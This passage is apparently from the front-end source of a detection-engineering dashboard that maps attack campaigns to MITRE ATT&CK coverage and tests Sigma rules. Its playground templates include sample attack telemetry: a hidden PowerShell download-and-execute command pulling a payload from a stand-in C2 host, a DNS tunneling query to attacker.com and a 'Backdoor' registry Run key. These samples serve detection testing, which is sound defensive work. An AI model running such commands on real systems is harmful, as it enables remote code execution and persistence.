"use client";

import { useState, useEffect, useRef } from "react";
import elasticDetections from "../src/data/elastic_detections.json";
import telemetryInventory from "../src/data/telemetry_inventory.json";
import { CAMPAIGNS, Campaign, LogEntry } from "../src/data/campaigns";
import {
  RULES,
  MOCK_TELEMETRY,
  compileToSplunk,
  compileToKql,
  evaluateRuleAgainstRecord,
  runValidation,
  TELEMETRY_REQUIREMENTS,
  analyzeLogQuality,
  generateScopingQueries,
  parseYamlRule,
  analyzeRuleResilience,
  Rule,
  THREAT_ADVISORIES,
  simulateYaraScan,
  simulateSIEMQuery
} from "../src/data/athena_data";

const DE_AXIOMS = [
  {
    number: "01",
    title: "Understanding Intent",
    quote: "Consumers of detections will suppress and ignore detections if they do not understand the intent of the detection.",
    insight: "If security analysts don't understand *why* a rule fired or what it is trying to achieve, they will treat it as noise. Documentation must clearly communicate intent."
  },
  {
    number: "02",
    title: "The Feedback Loop",
    quote: "Ignored or suppressed detections destroy the critical feedback loop used to improve those detections.",
    insight: "A rule is never 'done'. Without continuous telemetry on false positives and true positives, detection engineers cannot refine and tune their logic."
  },
  {
    number: "03",
    title: "Inevitability of Breaks",
    quote: "You will push a rule that will break something. Regardless of the controls, training, process, and planning. It will happen.",
    insight: "Mistakes are inevitable in complex production environments. Accept this reality and design process workflows around safety, rather than claiming perfection."
  },
  {
    number: "04",
    title: "Revert Speed Matters",
    quote: "A failure to quickly revert a change will damage your team's reputation much faster than the original break/issue. Plan and train for the worst.",
    insight: "Since breaks *will* happen, your MTTR (Mean Time to Respond/Revert) for configuration issues is key. Always have a one-click rollback mechanism ready."
  },
  {
    number: "05",
    title: "Simplicity Wins",
    quote: "The biggest failures in your work are usually due to a mundane or simple mistakes. Take it slow and don't overcomplicate things.",
    insight: "Avoid overly complex logic. Nested regexes and long strings of custom conditions are brittle. Simple, focused indicators are easier to maintain and verify."
  },
  {
    number: "06",
    title: "The Danger of Blind Regex",
    quote: "If you use REGEX without understanding the data, format, and scope - you will learn the latter things the hard way.",
    insight: "Regex is a powerful but dangerous tool. Without understanding the exact schema and data variation, a single wild card can consume SIEM CPU or completely drop detections."
  },
  {
    number: "07",
    title: "Avoid Chasing Everything",
    quote: "The fastest way to fail is trying to detect all the things. Find the commonality in your risk and attack there.",
    insight: "Prioritize rules based on actual risk and common threat actor behaviors. A focused catalog of high-fidelity rules is vastly superior to thousands of low-confidence ones."
  },
  {
    number: "08",
    title: "Missed Detections are Normal",
    quote: "Identifying detection opportunities that were missed during an incident is normal. Don't take it personally. Work the problem.",
    insight: "No defense is perfect. Missed events are valuable learning opportunities to conduct post-incident reviews, close visibility gaps, and mature your pipeline."
  },
  {
    number: "09",
    title: "DE is a Black Box",
    quote: "Detection Engineering is a black box to others. Communication and education to other departments is as important as any other detection task.",
    insight: "Educating other teams (like SOC, IT, and executives) on how detections work builds trust and alignment on remediation budgets and security tooling."
  },
  {
    number: "10",
    title: "Documentation is our Weapon",
    quote: "Process and Documentation are our weapons of choice. If you don't document what you know vs don't, you will never mature as a team.",
    insight: "Documentation is not a chore; it is an active defense capability. Documenting logic, gaps, and architectures prevents team silos and enables long-term maturity."
  }
];



// MITRE ATT&CK Matrix Layout (12 core tactics and common techniques)
const MITRE_SCHEMA = [
  {
    tacticId: "TA0001",
    tacticName: "Initial Access",
    techniques: [
      { id: "T1566.001", name: "Spearphishing Attachment" },
      { id: "T1190", name: "Exploit Public-Facing App" },
      { id: "T1078.004", name: "Valid Accounts: Cloud" }
    ]
  },
  {
    tacticId: "TA0002",
    tacticName: "Execution",
    techniques: [
      { id: "T1059.001", name: "PowerShell scripting" },
      { id: "T1059.003", name: "Windows Command Shell" },
      { id: "T1204.002", name: "Malicious File Execution" }
    ]
  },
  {
    tacticId: "TA0003",
    tacticName: "Persistence",
    techniques: [
      { id: "T1547.001", name: "Registry Run Keys" },
      { id: "T1098.001", name: "Additional Credentials" },
      { id: "T1136.001", name: "Create Local Account" }
    ]
  },
  {
    tacticId: "TA0004",
    tacticName: "Privilege Escalation",
    techniques: [
      { id: "T1134", name: "Access Token Manipulation" },
      { id: "T1548.002", name: "Bypass User Account Control" },
      { id: "T1055", name: "Process Injection" }
    ]
  },
  {
    tacticId: "TA0005",
    tacticName: "Defense Evasion",
    techniques: [
      { id: "T1562.001", name: "Impair Defenses: Disable EDR" },
      { id: "T1070.004", name: "File Deletion" },
      { id: "T1027", name: "Obfuscated Files or Info" }
    ]
  },
  {
    tacticId: "TA0006",
    tacticName: "Credential Access",
    techniques: [
      { id: "T1003.001", name: "OS Credential Dumping: LSASS" },
      { id: "T1003.002", name: "OS Credential Dumping: SAM" },
      { id: "T1111", name: "MFA Push Fatigue Bypass" }
    ]
  },
  {
    tacticId: "TA0007",
    tacticName: "Discovery",
    techniques: [
      { id: "T1083", name: "File and Directory Discovery" },
      { id: "T1057", name: "Process Discovery" },
      { id: "T1049", name: "System Network Discovery" }
    ]
  },
  {
    tacticId: "TA0008",
    tacticName: "Lateral Movement",
    techniques: [
      { id: "T1021.006", name: "Remote Services: WinRM" },
      { id: "T1021.001", name: "Remote Services: RDP" },
      { id: "T1080", name: "Tainted Shared Folders" }
    ]
  },
  {
    tacticId: "TA0009",
    tacticName: "Collection",
    techniques: [
      { id: "T1114.002", name: "Email Collection: Mailbox Search" },
      { id: "T1113", name: "Screen Capture" },
      { id: "T1115", name: "Clipboard Data Collection" }
    ]
  },
  {
    tacticId: "TA0011",
    tacticName: "Command & Control",
    techniques: [
      { id: "T1105", name: "Ingress Tool Transfer" },
      { id: "T1071.001", name: "Application Layer: Web Traffic" },
      { id: "T1071.004", name: "Application Layer: DNS Traffic" }
    ]
  },
  {
    tacticId: "TA0010",
    tacticName: "Exfiltration",
    techniques: [
      { id: "T1048.002", name: "Exfil Over Asymmetric Channel" },
      { id: "T1020", name: "Automated Exfiltration" },
      { id: "T1041", name: "Exfiltration Over C2 Channel" }
    ]
  },
  {
    tacticId: "TA0040",
    tacticName: "Impact",
    techniques: [
      { id: "T1486", name: "Data Encrypted for Impact" },
      { id: "T1490", name: "Inhibit System Recovery" },
      { id: "T1489", name: "Service Stop" }
    ]
  }
];

// Utility: JSON syntax highlighting function
function syntaxHighlight(jsonStr: string) {
  let json = jsonStr.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g, function (match) {
    let cls = 'json-number';
    if (/^"/.test(match)) {
      if (/:$/.test(match)) {
        cls = 'json-key';
      } else {
        cls = 'json-string';
      }
    } else if (/true|false/.test(match)) {
      cls = 'json-boolean';
    } else if (/null/.test(match)) {
      cls = 'json-null';
    }
    
    if (cls === 'json-key') {
      return `<span class="text-purple-400 font-medium">${match.replace(/:$/, '')}</span>:`;
    } else if (cls === 'json-string') {
      return `<span class="text-sky-400">${match}</span>`;
    } else if (cls === 'json-number') {
      return `<span class="text-rose-400">${match}</span>`;
    } else if (cls === 'json-boolean') {
      return `<span class="text-emerald-400 font-semibold">${match}</span>`;
    } else {
      return `<span class="text-slate-500 italic">${match}</span>`;
    }
  });
}

export default function Home() {
  // Dynamic Rules Registry & Telemetry state
  const [registeredRules, setRegisteredRules] = useState<Rule[]>(RULES);
  const [registryTelemetry, setRegistryTelemetry] = useState<Record<string, any[]>>(MOCK_TELEMETRY);
  const [isEditingDataset, setIsEditingDataset] = useState(false);
  const [datasetJsonText, setDatasetJsonText] = useState("");

  const [activeTab, setActiveTab] = useState<'sandbox' | 'compiler' | 'validation' | 'telemetry_audit' | 'ir_scoper' | 'detections' | 'telemetry' | 'playground' | 'resilience' | 'intel_lab'>('intel_lab');
  const [activeCampaignId, setActiveCampaignId] = useState<string>('apt29');
  const [highlightedTechId, setHighlightedTechId] = useState<string | null>(null);
  const [expandedLogIndexes, setExpandedLogIndexes] = useState<Set<number>>(new Set());
  const [customCampaign, setCustomCampaign] = useState<Campaign | null>(null);
  const [modalOpen, setModalOpen] = useState(false);
  const [pastedLogsText, setPastedLogsText] = useState("");
  const [validationError, setValidationError] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Resilience & Axioms State
  const [resilienceRuleId, setResilienceRuleId] = useState<string>(RULES[0].id);
  const [resilienceYaml, setResilienceYaml] = useState<string>(RULES[0].yaml_string);
  const [resilienceTabMode, setResilienceTabMode] = useState<'registry' | 'custom'>('registry');
  const [axiomIndex, setAxiomIndex] = useState<number>(0);

  // Threat Intel to Detection State
  const [intelAdvisoryId, setIntelAdvisoryId] = useState<string>("apt29-webshell");
  const [intelFormat, setIntelFormat] = useState<'yara' | 'kql' | 'spl'>('yara');
  const [intelPayloadYara, setIntelPayloadYara] = useState<string>("");
  const [intelPayloadKql, setIntelPayloadKql] = useState<string>("");
  const [intelPayloadSpl, setIntelPayloadSpl] = useState<string>("");
  const [intelYaraResult, setIntelYaraResult] = useState<{
    scanned: boolean;
    triggered: boolean;
    matchedStrings: string[];
    error: string | null;
  }>({ scanned: false, triggered: false, matchedStrings: [], error: null });
  const [intelSIEMResult, setIntelSIEMResult] = useState<{
    executed: boolean;
    triggered: boolean;
    error: string | null;
  }>({ executed: false, triggered: false, error: null });

  // Athena Compiler State
  const [selectedRuleIdCompiler, setSelectedRuleIdCompiler] = useState<string>(RULES[0].id);

  // Athena Validation Lab State
  const [selectedRuleIdValidation, setSelectedRuleIdValidation] = useState<string>(RULES[0].id);
  const [validationReport, setValidationReport] = useState<any>(null);
  const [emulationRunning, setEmulationRunning] = useState<boolean>(false);

  // Athena Telemetry Auditor State
  const [selectedSourceType, setSelectedSourceType] = useState<string>("sysmon");
  const [auditJsonInput, setAuditJsonInput] = useState<string>("");
  const [auditReport, setAuditReport] = useState<any>(null);

  // Athena IR Scoper State
  const [scoperHosts, setScoperHosts] = useState<string>("");
  const [scoperIps, setScoperIps] = useState<string>("");
  const [scoperUsers, setScoperUsers] = useState<string>("");
  const [scoperHashes, setScoperHashes] = useState<string>("");
  const [scoperQueries, setScoperQueries] = useState<{ splunk: string; kql: string } | null>(null);

  // DaC Playground State
  const [playgroundTemplate, setPlaygroundTemplate] = useState<string>("process_creation");
  const [playgroundYaml, setPlaygroundYaml] = useState<string>("");
  const [playgroundLog, setPlaygroundLog] = useState<string>("");
  const [playgroundEvaluationResult, setPlaygroundEvaluationResult] = useState<{
    evaluated: boolean;
    triggered: boolean;
    error: string | null;
  }>({
    evaluated: false,
    triggered: false,
    error: null
  });

  // Rules Database Tab Expansion State
  const [expandedRuleIds, setExpandedRuleIds] = useState<Set<string>>(new Set());

  // Sync sample JSON to editor when source type changes
  useEffect(() => {
    const sourceToRuleMap: Record<string, string> = {
      sysmon: "5b4e13d9-9fb2-47de-9852-ff14b9c1d3c5",
      active_directory: "c46f772e-d00f-48d6-953e-52ebc2b7ab7f",
      azure_entra: "e4617a22-38e2-411a-8bb7-09d57a9e0f6b",
      aws: "a24d8b99-a411-4824-9b2d-cf211a7a13fb",
      dns: "d8d74542-a8b2-4d26-bb21-1d361c47a544"
    };
    const defaultRuleId = sourceToRuleMap[selectedSourceType];
    const defaultLog = registryTelemetry[defaultRuleId]?.[0];
    if (defaultLog) {
      // Remove label before displaying
      const { label, ...cleanLog } = defaultLog;
      setAuditJsonInput(JSON.stringify(cleanLog, null, 2));
    } else {
      setAuditJsonInput("{}");
    }
    setAuditReport(null);
  }, [selectedSourceType, registryTelemetry]);

  // Sync DaC Playground templates and logs
  useEffect(() => {
    const templates: Record<string, { yaml: string; log: string }> = {
      process_creation: {
        yaml: `title: Suspicious Process Launch\ndescription: Detects the launch of suspicious shells or script interpreters.\nseverity: medium\nstatus: experimental\nauthor: Detection Engineer\nlogsource:\n  category: endpoint\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    EventID: 1\n    Image:\n      - '*\\cmd.exe'\n      - '*\\powershell.exe'\n      - '*\\wscript.exe'\n      - '*\\cscript.exe'\n  condition: selection`,
        log: `{\n  "EventID": 1,\n  "Image": "C:\\\\Windows\\\\System32\\\\powershell.exe",\n  "CommandLine": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.internal/payload')"\n}`
      },
      registry_mod: {
        yaml: `title: Registry Persistence Run Key\ndescription: Detects modifications to Windows run keys used to establish persistent access.\nseverity: high\nstatus: experimental\nauthor: Detection Engineer\nlogsource:\n  category: endpoint\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    EventID: 13\n    TargetObject:\n      - '*\\Microsoft\\Windows\\CurrentVersion\\Run\\*'\n      - '*\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*'\n  condition: selection`,
        log: `{\n  "EventID": 13,\n  "TargetObject": "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Backdoor",\n  "Details": "C:\\\\Windows\\\\Temp\\\\agent.exe"\n}`
      },
      dns_tunnel: {
        yaml: `title: DNS Tunneling Detection\ndescription: Detects DNS queries with abnormally long query strings or TXT records.\nseverity: high\nstatus: test\nauthor: Detection Engineer\nlogsource:\n  category: network\n  product: dns\n  service: queries\ndetection:\n  selection:\n    query_length: '> 80'\n    query_type: 'TXT'\n  condition: selection`,
        log: `{\n  "query": "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789.attacker.com",\n  "query_type": "TXT",\n  "query_length": 86,\n  "src_ip": "10.0.0.4"\n}`
      }
    };

    const t = templates[playgroundTemplate];
    if (t) {
      setPlaygroundYaml(t.yaml);
      setPlaygroundLog(t.log);
      setPlaygroundEvaluationResult({ evaluated: false, triggered: false, error: null });
    }
  }, [playgroundTemplate]);

  // Sync selected registry rule YAML to the resilience editor when rule ID or mode changes
  useEffect(() => {
    if (resilienceTabMode === 'registry') {
      const rule = registeredRules.find(r => r.id === resilienceRuleId);
      if (rule) {
        setResilienceYaml(rule.yaml_string);
      }
    }
  }, [resilienceRuleId, resilienceTabMode, registeredRules]);

  // Sync datasetJsonText when selectedRuleIdValidation changes
  useEffect(() => {
    const dataset = registryTelemetry[selectedRuleIdValidation] || [];
    setDatasetJsonText(JSON.stringify(dataset, null, 2));
    setIsEditingDataset(false);
    setValidationReport(null);
  }, [selectedRuleIdValidation, registryTelemetry]);

  // Sync default payloads when Threat Advisory changes
  useEffect(() => {
    const adv = THREAT_ADVISORIES.find(a => a.id === intelAdvisoryId);
    if (adv) {
      setIntelPayloadYara(adv.yaraPayload);
      setIntelPayloadKql(adv.kqlPayload);
      setIntelPayloadSpl(adv.splPayload);
      setIntelYaraResult({ scanned: false, triggered: false, matchedStrings: [], error: null });
      setIntelSIEMResult({ executed: false, triggered: false, error: null });
    }
  }, [intelAdvisoryId]);

  // References for scrolling elements
  const timelineItemRefs = useRef<Record<string, HTMLDivElement | null>>({});
  const matrixCellRefs = useRef<Record<string, HTMLDivElement | null>>({});

  // Active Campaign Object
  const campaign: Campaign = activeCampaignId === 'custom' && customCampaign 
    ? customCampaign 
    : CAMPAIGNS[activeCampaignId] || CAMPAIGNS.apt29;

  // Active coverage metrics
  const totalLogs = campaign.logs.length;
  const coveredLogs = campaign.logs.filter(l => l.coverage_details.status === 'full_coverage').length;
  const gapLogs = campaign.logs.filter(l => l.coverage_details.status === 'partial_coverage').length;
  const blindspotLogs = campaign.logs.filter(l => l.coverage_details.status === 'no_coverage').length;

  // Sync log expand sets
  const toggleLogExpand = (index: number) => {
    const next = new Set(expandedLogIndexes);
    if (next.has(index)) {
      next.delete(index);
    } else {
      next.add(index);
    }
    setExpandedLogIndexes(next);
  };

  const handleRegisterRule = () => {
    if (!playgroundYaml.trim()) {
      alert("Cannot register rule: please verify the YAML first.");
      return;
    }
    
    let parsed: any;
    try {
      parsed = parseYamlRule(playgroundYaml);
    } catch (e: any) {
      alert(`Cannot register rule: Malformed YAML - ${e.message}`);
      return;
    }

    if (!parsed.title || parsed.title === "Untitled Sigma Rule") {
      alert("Please specify a descriptive title in your Sigma YAML rule.");
      return;
    }

    // Ensure the rule has a unique ID, or generate one
    const newId = parsed.id && parsed.id !== "temp-id-12345"
      ? parsed.id 
      : `rule-${Date.now()}`;
      
    const ruleToAdd: Rule = {
      ...parsed,
      id: newId,
      yaml_string: playgroundYaml
    };

    // Add to registeredRules state
    setRegisteredRules(prev => {
      const existsIdx = prev.findIndex(r => r.id === newId || r.title === parsed.title);
      if (existsIdx !== -1) {
        const next = [...prev];
        next[existsIdx] = ruleToAdd;
        return next;
      }
      return [...prev, ruleToAdd];
    });

    // Add current playgroundLog as its telemetry if valid JSON
    let mockEvents: any[] = [];
    try {
      if (playgroundLog.trim()) {
        const rec = JSON.parse(playgroundLog);
        if (Array.isArray(rec)) {
          mockEvents = rec.map(r => ({ ...r, label: r.label || 'malicious' }));
        } else {
          mockEvents = [{ ...rec, label: rec.label || 'malicious' }];
        }
      }
    } catch (e) {
      // ignore
    }

    // If no events were provided or parsed, create a default matching log for validation purposes
    if (mockEvents.length === 0) {
      const mockRecord: any = { label: "malicious" };
      if (parsed.detection) {
        for (const [selectKey, selectObj] of Object.entries(parsed.detection)) {
          if (selectKey !== 'condition' && selectObj && typeof selectObj === 'object') {
            for (const [f, val] of Object.entries(selectObj)) {
              mockRecord[f] = Array.isArray(val) ? val[0] : val;
            }
          }
        }
      }
      if (!mockRecord.EventID && parsed.logsource?.service === 'sysmon') {
        mockRecord.EventID = 1;
      }
      mockEvents = [mockRecord];
    }

    setRegistryTelemetry(prev => ({
      ...prev,
      [newId]: mockEvents
    }));

    // Switch to database and select this rule
    setExpandedRuleIds(prev => {
      const next = new Set(prev);
      next.add(newId);
      return next;
    });

    setSelectedRuleIdCompiler(newId);
    setSelectedRuleIdValidation(newId);
    setResilienceRuleId(newId);
    setActiveTab('detections');
  };

  const handleSaveDataset = () => {
    try {
      const parsed = JSON.parse(datasetJsonText);
      if (!Array.isArray(parsed)) {
        alert("Dataset must be a JSON array of event log objects.");
        return;
      }
      setRegistryTelemetry(prev => ({
        ...prev,
        [selectedRuleIdValidation]: parsed
      }));
      setIsEditingDataset(false);
      setValidationReport(null);
    } catch (e: any) {
      alert(`Invalid JSON format: ${e.message}`);
    }
  };

  // Interaction handlers
  const handleMatrixCellClick = (techId: string) => {
    setHighlightedTechId(techId);

    // Expand and highlight corresponding timeline item
    const matchingLogIndex = campaign.logs.findIndex(l => l.mitre_attack?.technique?.id === techId);
    if (matchingLogIndex !== -1) {
      const next = new Set(expandedLogIndexes);
      next.add(matchingLogIndex);
      setExpandedLogIndexes(next);

      setTimeout(() => {
        const item = timelineItemRefs.current[`log-${matchingLogIndex}`];
        if (item) {
          item.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 100);
    }
  };

  const handleMitreBadgeClick = (techId: string, e: React.MouseEvent) => {
    e.stopPropagation(); // Avoid triggering card toggle
    setHighlightedTechId(techId);

    // Scroll to matrix cell
    setTimeout(() => {
      const cell = matrixCellRefs.current[`cell-${techId}`];
      if (cell) {
        cell.scrollIntoView({ behavior: 'smooth', block: 'center' });
        cell.classList.add('animate-pulse');
        setTimeout(() => cell.classList.remove('animate-pulse'), 2000);
      }
    }, 100);
  };

  // Custom Log Parser
  const handleLogsUpload = (rawText: string) => {
    if (!rawText.trim()) {
      setValidationError("Please input some JSON logs.");
      return;
    }

    try {
      const parsed = JSON.parse(rawText);
      const logArray: any[] = Array.isArray(parsed) ? parsed : [parsed];

      if (logArray.length === 0) {
        setValidationError("JSON list must contain at least one event log object.");
        return;
      }

      // Format custom log objects to match schema
      const enrichedLogs: LogEntry[] = logArray.map(log => {
        const enriched = { ...log };
        if (!enriched['@timestamp'] && enriched.timestamp) {
          enriched['@timestamp'] = enriched.timestamp;
        } else if (!enriched['@timestamp']) {
          enriched['@timestamp'] = new Date().toISOString();
        }

        if (!enriched.event) enriched.event = { action: 'custom-parsed-event' };
        if (!enriched.host) enriched.host = { name: 'external-sensor' };

        // Auto map a simulation if they didn't include mitre structures
        if (!enriched.mitre_attack) {
          enriched.mitre_attack = {
            tactic: { id: "TA0002", name: "Execution" },
            technique: { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell" }
          };
          enriched.coverage_details = {
            status: "partial_coverage",
            gap_id: "GAP-CUST-01",
            summary: "Custom Ingestion Telemetry Auditing Missing",
            gap_reason: "Custom log payload parsed successfully, but lacks code integrity validations or command audits inside the environment.",
            remediation: {
              title: "Enable Local Script Execution Auditing",
              impact: "Bridges detection gaps for unverified scripts running in high-security contexts.",
              steps: [
                "Configure host EDR sensors to forward telemetry matching process arguments.",
                "Deploy GPO templates to log local script load profiles."
              ],
              cmd: "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f"
            }
          };
          enriched.detection_status = 'Monitored';
        }

        return enriched as LogEntry;
      });

      const total = enrichedLogs.length;
      const covered = enrichedLogs.filter(l => l.coverage_details.status === 'full_coverage').length;
      const gaps = enrichedLogs.filter(l => l.coverage_details.status === 'partial_coverage').length;
      const blindspots = enrichedLogs.filter(l => l.coverage_details.status === 'no_coverage').length;

      const newCampaign: Campaign = {
        name: "🛡️ Custom Uploaded Logs",
        description: "Logs uploaded manually by the user, dynamically parsed and mapped in real-time.",
        metrics: { total, covered, gaps, blindspots },
        logs: enrichedLogs
      };

      setCustomCampaign(newCampaign);
      setActiveCampaignId('custom');
      setModalOpen(false);
      setValidationError(null);
      setExpandedLogIndexes(new Set());
    } catch (err: any) {
      setValidationError(`Invalid JSON Structure: ${err.message}`);
    }
  };

  const handleCopyCommand = (cmd: string, btnId: string) => {
    navigator.clipboard.writeText(cmd).then(() => {
      const btn = document.getElementById(btnId);
      if (btn) {
        const originalText = btn.textContent;
        btn.textContent = "Copied!";
        btn.style.color = "#10b981"; // Emerald
        setTimeout(() => {
          btn.textContent = originalText;
          btn.style.color = "";
        }, 1500);
      }
    });
  };

  // Drag and Drop files
  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    const file = e.dataTransfer.files[0];
    if (file && file.type === "application/json") {
      const reader = new FileReader();
      reader.onload = (event) => {
        if (event.target?.result) {
          setPastedLogsText(event.target.result as string);
        }
      };
      reader.readAsText(file);
    }
  };

  // Compile coverage dictionary for matrix heatmap rendering
  const matrixCoverageMap: Record<string, 'full_coverage' | 'partial_coverage' | 'no_coverage'> = {};
  campaign.logs.forEach(log => {
    if (log.mitre_attack?.technique?.id) {
      matrixCoverageMap[log.mitre_attack.technique.id] = log.coverage_details.status;
    }
  });

  return (
    <main className="min-h-screen bg-[#07090e] text-slate-100 flex flex-col md:flex-row font-sans">
      {/* Sidebar Navigation */}
      <aside className="w-full md:w-[280px] bg-[#0d111c]/70 md:border-r border-slate-800/60 p-6 flex flex-col gap-8 backdrop-blur-xl shrink-0">
        <div className="flex items-center gap-3">
          <div className="bg-gradient-to-br from-indigo-500 to-purple-600 w-9 h-9 rounded-lg flex items-center justify-center font-bold text-lg text-white shadow-lg shadow-indigo-500/30">
            ⚔️
          </div>
          <div>
            <h1 className="text-[1.05rem] font-bold tracking-tight bg-gradient-to-r from-white to-purple-400 bg-clip-text text-transparent">
              ATT&CK Coverage
            </h1>
            <span className="text-[0.65rem] text-slate-500 font-semibold uppercase tracking-wider block">
              Gap Mapping & Analytics
            </span>
          </div>
        </div>

        {/* View Mode Tabs */}
        <div className="flex flex-col gap-1">
          <span className="text-[0.7rem] uppercase text-slate-500 tracking-wider font-semibold mb-2">MITRE Workspace</span>
          <button 
            onClick={() => setActiveTab('sandbox')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'sandbox' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            🛡️ Campaign Heatmap
          </button>
          <button 
            onClick={() => setActiveTab('intel_lab')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'intel_lab' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            📝 Threat Intel to Detection Lab
          </button>

          <span className="text-[0.7rem] uppercase text-slate-500 tracking-wider font-semibold mt-4 mb-2">Athena Pipeline</span>
          <button 
            onClick={() => setActiveTab('playground')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'playground' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            💻 DaC Playground
          </button>
          <button 
            onClick={() => setActiveTab('compiler')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'compiler' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            🛠️ SIEM Compiler
          </button>
          <button 
            onClick={() => setActiveTab('validation')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'validation' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            🧪 Emulation & Lab
          </button>
          <button 
            onClick={() => setActiveTab('telemetry_audit')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'telemetry_audit' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            📊 Telemetry Auditor
          </button>
          <button 
            onClick={() => setActiveTab('ir_scoper')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'ir_scoper' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            🚨 IR Fast Scoper
          </button>

          <span className="text-[0.7rem] uppercase text-slate-500 tracking-wider font-semibold mt-4 mb-2">Inventory & Feeds</span>
          <button 
            onClick={() => setActiveTab('detections')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'detections' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            🔍 Rules Database
          </button>
          <button 
            onClick={() => setActiveTab('resilience')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'resilience' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            📐 Resilience & Axioms
          </button>
          <button 
            onClick={() => setActiveTab('telemetry')}
            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'telemetry' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
          >
            📋 Telemetry Inventory
          </button>
        </div>

        {/* Active Campaigns Selectors (Only shown in Sandbox tab) */}
        {activeTab === 'sandbox' && (
          <div className="flex flex-col gap-1">
            <span className="text-[0.7rem] uppercase text-slate-500 tracking-wider font-semibold mb-2">Simulated Scenarios</span>
            
            <button 
              onClick={() => setActiveCampaignId('apt29')}
              className={`w-full text-left px-3 py-2.5 rounded-lg transition-all flex flex-col gap-0.5 border ${activeCampaignId === 'apt29' ? 'bg-indigo-950/20 border-indigo-500/30 text-slate-100 shadow-lg shadow-indigo-500/5' : 'border-transparent text-slate-400 hover:bg-slate-800/30'}`}
            >
              <span className="text-[0.85rem] font-semibold">APT29 Intrusion</span>
              <span className="text-[0.68rem] text-slate-500">6 events • Email & Lateral</span>
            </button>

            <button 
              onClick={() => setActiveCampaignId('ransomware')}
              className={`w-full text-left px-3 py-2.5 rounded-lg transition-all flex flex-col gap-0.5 border ${activeCampaignId === 'ransomware' ? 'bg-indigo-950/20 border-indigo-500/30 text-slate-100 shadow-lg shadow-indigo-500/5' : 'border-transparent text-slate-400 hover:bg-slate-800/30'}`}
            >
              <span className="text-[0.85rem] font-semibold">LockBit Ransomware</span>
              <span className="text-[0.68rem] text-slate-500">5 events • Shadow Deletion</span>
            </button>

            <button 
              onClick={() => setActiveCampaignId('cloud')}
              className={`w-full text-left px-3 py-2.5 rounded-lg transition-all flex flex-col gap-0.5 border ${activeCampaignId === 'cloud' ? 'bg-indigo-950/20 border-indigo-500/30 text-slate-100 shadow-lg shadow-indigo-500/5' : 'border-transparent text-slate-400 hover:bg-slate-800/30'}`}
            >
              <span className="text-[0.85rem] font-semibold">Cloud Privilege Abuse</span>
              <span className="text-[0.68rem] text-slate-500">5 events • Entra MFA Bypass</span>
            </button>

            <button 
              onClick={() => setActiveCampaignId('active_directory_escalation')}
              className={`w-full text-left px-3 py-2.5 rounded-lg transition-all flex flex-col gap-0.5 border ${activeCampaignId === 'active_directory_escalation' ? 'bg-indigo-950/20 border-indigo-500/30 text-slate-100 shadow-lg shadow-indigo-500/5' : 'border-transparent text-slate-400 hover:bg-slate-800/30'}`}
            >
              <span className="text-[0.85rem] font-semibold">AD Domain Escalation</span>
              <span className="text-[0.68rem] text-slate-500">5 events • Kerberoast & DCSync</span>
            </button>

            <button 
              onClick={() => setActiveCampaignId('dns_tunneling_c2')}
              className={`w-full text-left px-3 py-2.5 rounded-lg transition-all flex flex-col gap-0.5 border ${activeCampaignId === 'dns_tunneling_c2' ? 'bg-indigo-950/20 border-indigo-500/30 text-slate-100 shadow-lg shadow-indigo-500/5' : 'border-transparent text-slate-400 hover:bg-slate-800/30'}`}
            >
              <span className="text-[0.85rem] font-semibold">DNS Tunneling & C2</span>
